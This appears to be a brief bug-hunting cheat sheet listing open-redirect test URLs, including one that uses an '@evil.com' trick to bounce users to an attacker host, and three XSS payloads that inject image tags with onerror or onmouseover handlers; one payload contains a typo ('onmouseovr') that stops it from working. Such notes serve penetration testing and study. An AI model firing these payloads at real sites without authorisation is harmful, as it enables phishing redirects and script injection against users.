# Open redirect

__`https://test.com/?redirect=https://www.google.com`__
__`https://test.com/?redirect=https://www.google.com@evil.com`__


# Cross-Site Scripting (XSS)

- __`"><image src=x onerror=alert()>`__
- __`"><image src=x onmouseover=alert()>`__
- __`"><image src=x onmouseovr=document.write(1)>`__
- > __If you are not getting /?id= in url you can use burpsuite__
  - ![image1]()
